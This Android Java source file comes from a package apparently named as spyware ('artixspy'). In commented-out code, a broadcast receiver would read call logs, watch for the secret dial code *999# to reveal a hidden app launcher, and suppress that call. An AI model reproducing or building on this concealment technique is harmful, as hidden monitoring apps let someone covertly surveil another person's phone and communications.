package com.example.artixspy;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

public class Myreciver extends BroadcastReceiver {

    public  static String code ="*999#";
    @Override
    public void onReceive(Context context, Intent intent) {

        /*HomeAvc home =  new HomeAvc();
        home.FetchCalllogs();
        String dialno = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if (dialno == null){
            dialno = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

        }
        if (dialno.equals(code)){
            PackageManager p = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, com.example.artixspy.MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

            Intent intent1 = new Intent(context,MainActivity.class);
            intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent1);
        }


setResultData(null);*/
    }
}
